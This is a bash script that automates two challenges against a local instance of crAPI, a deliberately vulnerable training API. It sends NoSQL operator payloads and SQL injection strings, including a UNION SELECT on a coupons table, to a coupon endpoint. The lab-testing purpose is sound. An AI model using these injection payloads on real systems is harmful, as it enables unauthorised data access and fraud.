#!/bin/bash
# crAPI Challenges 12-13: Coupon Injection (NoSQL + SQL)
# Multi-step: Login → probe coupon endpoint → NoSQL injection → SQL injection
BASE="http://localhost:8888"
LOG="test_logs/crapi_chain6_coupon.log"
> "$LOG"

echo "=== crAPI Chain: Coupon Injection (Challenges 12-13) ===" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 1: Login
echo "--- Step 1: Login ---" | tee -a "$LOG"
TOKEN=$(curl -s -X POST "$BASE/identity/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"Passw0rd!"}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null)
echo "Token: ${TOKEN:0:50}..." | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 2: Try normal coupon
echo "--- Step 2: Try normal coupon codes ---" | tee -a "$LOG"
for CODE in TEST DISCOUNT SAVE10 ADMIN FREE; do
  echo -n "  Coupon '$CODE': " | tee -a "$LOG"
  curl -s -X POST "$BASE/workshop/api/shop/apply_coupon" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"coupon_code\":\"$CODE\",\"amount\":10}" | tee -a "$LOG"
  echo "" | tee -a "$LOG"
done
echo "" | tee -a "$LOG"

# Step 3: NoSQL injection attempts (Challenge 12)
echo "--- Step 3: NoSQL injection attempts ---" | tee -a "$LOG"

echo '  {"$ne": "invalid"}:' | tee -a "$LOG"
curl -s -X POST "$BASE/workshop/api/shop/apply_coupon" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code":{"$ne":"invalid"},"amount":10}' | tee -a "$LOG"
echo "" | tee -a "$LOG"

echo '  {"$gt": ""}:' | tee -a "$LOG"
curl -s -X POST "$BASE/workshop/api/shop/apply_coupon" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code":{"$gt":""},"amount":10}' | tee -a "$LOG"
echo "" | tee -a "$LOG"

echo '  {"$regex": ".*"}:' | tee -a "$LOG"
curl -s -X POST "$BASE/workshop/api/shop/apply_coupon" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code":{"$regex":".*"},"amount":10}' | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Step 4: SQL injection attempts (Challenge 13)
echo "--- Step 4: SQL injection attempts ---" | tee -a "$LOG"

echo "  ' OR 1=1 --:" | tee -a "$LOG"
curl -s -X POST "$BASE/workshop/api/shop/apply_coupon" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"coupon_code\":\"' OR 1=1 --\",\"amount\":10}" | tee -a "$LOG"
echo "" | tee -a "$LOG"

echo "  UNION SELECT:" | tee -a "$LOG"
curl -s -X POST "$BASE/workshop/api/shop/apply_coupon" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"coupon_code\":\"' UNION SELECT coupon_code FROM coupons--\",\"amount\":10}" | tee -a "$LOG"
echo "" | tee -a "$LOG"

echo "=== Coupon Injection Chain Complete ===" | tee -a "$LOG"
echo "Finished: $(date)" | tee -a "$LOG"
